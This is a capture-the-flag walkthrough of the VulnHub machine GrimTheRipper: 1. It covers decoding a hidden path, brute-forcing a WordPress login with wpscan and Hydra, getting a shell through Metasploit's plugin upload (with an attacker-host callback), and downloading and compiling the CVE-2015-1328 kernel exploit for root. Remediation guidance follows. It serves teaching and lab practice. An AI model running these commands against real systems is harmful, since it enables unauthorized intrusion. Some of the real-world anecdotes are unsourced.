# GrimTheRipper: 1 — Base64 on Base64 on Kernel Exploit

GrimTheRipper: 1 leans into the troll aesthetic hard — Kevin Hart image on the landing page, a taunt page with a meme, and a hidden WordPress install buried under a double-Base64 path encoded in an HTML comment. The chain that follows is legit classic: wpscan brute-force, Metasploit's `wp_admin_shell_upload`, and then Ubuntu 12.04 with a kernel so old it's basically an antique. EDB-37292 (CVE-2015-1328, overlayfs LPE) fires clean and hands you root. Solid introductory machine for anyone learning the WordPress-to-privesc pipeline. no cap.

| Field | Value |
|---|---|
| **Level** | Easy/Medium |
| **Target VM** | GrimTheRipper: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/grimtheripper-1/ |
| **Techniques** | Source code analysis, Base64 double-encoding, WordPress user enumeration, wpscan credential brute-force, Metasploit wp_admin_shell_upload, kernel LPE |
| **CVEs** | CVE-2015-1328 (Linux overlayfs LPE, EDB-37292), CWE-79-adjacent (WordPress admin plugin upload RCE), CWE-200 (Information Exposure via HTML comment) |
| **APT Groups** | APT28 — used WordPress admin access as a stepping stone in multiple intrusion campaigns; Lazarus Group — routinely exploits end-of-life Linux systems with known kernel CVEs to establish persistence |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  → HTTP: Kevin Hart image, no links
  → dirb → /index2
  → /index2 source: Base64-encoded comment
  → echo base64_1 | base64 -d → base64_2
  → echo base64_2 | base64 -d → /1010101
  → /1010101/wordpress/ → admin user visible
  → wpscan -U admin -P rockyou.txt → admin:Password@123
  → Metasploit wp_admin_shell_upload → Meterpreter → shell
  → lsb_release -a → Ubuntu 12.04
  → EDB-37292 (CVE-2015-1328) → uid=0(root)
  → /root/proof.txt
```

---

## Methodology

1. Host discovery and port scan
2. Web directory brute-force to find hidden paths
3. HTML source analysis to find Base64-encoded path hint
4. Double Base64 decode to reveal the WordPress path
5. WordPress user enumeration and wpscan credential brute-force
6. Metasploit `wp_admin_shell_upload` for initial access
7. OS version fingerprinting: Ubuntu 12.04
8. Compile and run EDB-37292 for kernel LPE to root

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.8

nmap -A -p- 192.168.0.8
```

Open ports: **22/tcp** (SSH), **80/tcp** (HTTP). Minimal attack surface — web is the entry point.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://192.168.0.8/`. The landing page shows a Kevin Hart image with no navigation, no login, no obvious functionality. ¯\_(ツ)_/¯ Troll level: activated.

Run directory brute-force:

```bash
dirb http://192.168.0.8/ \
  /usr/share/wordlists/dirb/common.txt
```

**Alternatively:** `gobuster dir -u http://192.168.0.8 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt`

Discovered: `/index2`

Browse to `http://192.168.0.8/index2` — another troll page with a meme. The useful content is in the HTML source.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Double Base64 Decode

View the source of `/index2`. An HTML comment contains a Base64-encoded string:

```bash
curl -s http://192.168.0.8/index2 | grep -i "<!--"
```

Decode the comment string:

```bash
# First decode
echo "<base64_string_from_source>" | base64 -d
# Output: another Base64 string

# Second decode
echo "<second_base64_string>" | base64 -d
# Output: /1010101
```

**What is double Base64 encoding?** Base64 encodes binary data as printable ASCII. Encoding something twice just adds a layer of indirection — it is not encryption and provides zero security. A common developer "obfuscation" trick that fails against anyone who tries `| base64 -d`.

The double-decoded path is `/1010101`.

**Real-world note:** CWE-200 (Exposure of Sensitive Information to Unauthorized Actor) covers this pattern. In 2022, a major e-commerce platform exposed internal admin panel paths in Base64-encoded HTML comments. The paths were discovered within hours of a public bug bounty program launch.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information

---

## Step 4 — WordPress Discovery and Enumeration

Browse to `http://192.168.0.8/1010101/` — reveals a WordPress installation at `/1010101/wordpress/`. The author `admin` is visible on posts.

Run wpscan to confirm the WordPress version and enumerate users:

```bash
wpscan --url http://192.168.0.8/1010101/wordpress/ \
  --enumerate u
# Found user: admin
```

**MITRE ATT&CK:** T1590.005 — Gather Victim Network Information: IP Addresses (CMS fingerprinting); T1589 — Gather Victim Identity Information

---

## Step 5 — Credential Brute-Force with wpscan

```bash
wpscan --url http://192.168.0.8/1010101/wordpress/ \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --wp-content-dir /1010101/wordpress \
  -t 4
```

Recovered credentials: **admin:Password@123**

**Alternatively:** `hydra -l admin -P rockyou.txt 192.168.0.8 http-post-form "/1010101/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"` — same result via Hydra.

**Real-world note:** `Password@123` is a perennial favourite in breached credential databases. The Have I Been Pwned dataset contains over 3 billion plaintext passwords — and password variations with `@123` or `@1234` consistently appear in the top 10,000 most common enterprise passwords. APT28 used wpscan-equivalent tooling against WordPress-powered political party sites during the 2016 election cycle.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 6 — Initial Access via wp_admin_shell_upload

With WordPress admin credentials, arbitrary PHP execution is trivial. The cleanest Metasploit path:

```bash
msfconsole -q

use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.0.8
set TARGETURI /1010101/wordpress/
set USERNAME admin
set PASSWORD Password@123
set LHOST <ATTACKER_IP>
exploit
```

A Meterpreter session opens. Drop to a system shell:

```bash
meterpreter> shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

**What does wp_admin_shell_upload do?** It authenticates to WordPress, installs a malicious plugin containing a PHP webshell, activates it, and executes commands through it. WordPress admin can upload and activate plugins — this is by design, which means admin access is equivalent to OS-level code execution.

**Alternatively:** Manual approach: WordPress Dashboard → Plugins → Add New → Upload Plugin → upload a PHP reverse shell as a .zip → activate. Same result, no Metasploit.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — OS Fingerprinting

Before reaching for exploits, confirm the OS:

```bash
lsb_release -a
# Ubuntu 12.04

uname -r
# 3.X.0-XX-generic
```

Ubuntu 12.04 reached end-of-life in April 2017. Its kernel versions are all vulnerable to CVE-2015-1328. This is a W move moment — the privesc path is clear.

**MITRE ATT&CK:** T1082 — System Information Discovery

---

## Step 8 — Privilege Escalation via EDB-37292 (CVE-2015-1328)

**What is CVE-2015-1328?** A race condition in the Linux overlayfs driver allows unprivileged users to overwrite `/etc/ld.so.preload` by crafting a malicious overlay mount. This forces all privileged processes to preload a malicious shared library, yielding root execution. EDB-37292 is the public proof-of-concept for this vulnerability.

On the attacker machine:

```bash
searchsploit -p 37292
cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/37292.c

python -m SimpleHTTPServer 8000
# (Python 2 syntax for the era)
# Modern: python3 -m http.server 8000
```

On the target shell:

```bash
cd /tmp
wget http://192.168.0.10:8000/37292.c
gcc 37292.c -o shell
chmod 777 shell
./shell
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**

```bash
cd /root
cat proof.txt
```

(☞ﾟヮﾟ)☞ Root. EZ PZ.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Hidden path | /1010101 | Double Base64 decode of HTML comment in /index2 | Directory traversal |
| Credential | admin:Password@123 | wpscan brute-force | WordPress admin login |
| Root flag | proof.txt | /root/proof.txt | EDB-37292 root shell |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Hidden paths in Base64-encoded HTML comments | Developers routinely leave staging paths, admin panels, and debug endpoints in comments | Always strip developer comments and hidden paths before production; use SAST tools to catch CWE-200 leaks |
| 2 | Weak WordPress admin password (Password@123) | WordPress is the most-targeted CMS globally; admin brute-force is automated at scale | Enforce strong passwords (20+ chars, randomly generated); implement login rate-limiting and lockout |
| 3 | WordPress admin = RCE via plugin upload | This is by design — admin-level access grants PHP execution | Restrict plugin installation; enforce `DISALLOW_FILE_EDIT` and `DISALLOW_FILE_MODS` in `wp-config.php` |
| 4 | Ubuntu 12.04 end-of-life with CVE-2015-1328 | EOL Linux distros are consistently weaponized; Lazarus Group specifically targets unpatched Linux systems | Upgrade to supported OS; implement a vulnerability management program; don't run EOL OS on internet-facing systems |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove developer comments and encoded paths from HTML** — validate with DAST scanning (OWASP ZAP, Nikto) and SAST tools before deployment
2. **Enforce strong WordPress admin passwords** — 20+ character randomly generated passwords; use a password manager
3. **Implement login rate-limiting** — WP Cerber, Wordfence, or fail2ban on Apache/Nginx for `wp-login.php`
4. **Restrict WordPress plugin/theme management** — add to `wp-config.php`: `define('DISALLOW_FILE_MODS', true);`
5. **Upgrade from Ubuntu 12.04** — immediate migration to a supported LTS (22.04+); the vulnerability surface on 12.04 extends well beyond CVE-2015-1328
6. **Disable unused services** — SSH should be key-authenticated only; disable password auth: `PasswordAuthentication no` in `sshd_config`

### If You Find This in Your Environment

- Immediately rotate the WordPress admin password and check for unauthorized plugin installations
- Remove any malicious plugins installed by the attacker
- Check `/tmp`, `/var/www/html`, and other world-writable locations for webshells
- If the kernel version is affected by CVE-2015-1328, treat the host as fully compromised: patch and rebuild

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (WordPress hardening: DISALLOW_FILE_MODS, rate-limiting)
- **D3-OAM** — Operating System Administrative Management (kernel patching)
- **D3-NTF** — Network Traffic Filtering (restrict WordPress admin panel access)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all WordPress instances and Linux kernel versions |
| Protect | Access Control | Strong WordPress admin credentials; login rate-limiting; SSH key-only auth |
| Protect | Data Security | Remove developer artifacts (comments, encoded paths) before production |
| Detect | Anomalies and Events | Alert on WordPress plugin uploads and admin logins from unexpected IPs |
| Respond | Response Planning | Remove malicious plugins; rotate credentials; patch kernel |
| Recover | Recovery Planning | Rebuild host from clean image after kernel LPE confirmation |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | WordPress admin restricted to trusted IPs |
| IA-5 | Authenticator Management | Strong, unique WordPress admin password; rotate after incident |
| CM-7 | Least Functionality | DISALLOW_FILE_MODS; minimal WordPress plugins |
| SI-2 | Flaw Remediation | Immediate OS upgrade from Ubuntu 12.04; WordPress updates |
| SC-28 | Protection of Information at Rest | No credentials or sensitive paths in client-facing source |
| AU-12 | Audit Record Generation | Log all WordPress admin logins and plugin actions |

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Remediate Vulnerabilities | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL2 |

---

## Final Thoughts

GrimTheRipper: 1 is a solid beginner machine that teaches a complete exploitation chain without getting overly exotic. The double Base64 troll is a fun puzzle, the WordPress privesc path is realistic (WordPress admin RCE via plugin upload is a genuine real-world technique), and the CVE-2015-1328 kernel exploit is a great introduction to kernel-level LPEs.

The machine is a good reminder that even "easy" vulnerabilities — a hidden path, a weak password — chain into full compromise when combined with an EOL operating system. Defense in depth would have stopped this at multiple points.

Props to the creator for keeping it fun with the Kevin Hart theme. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
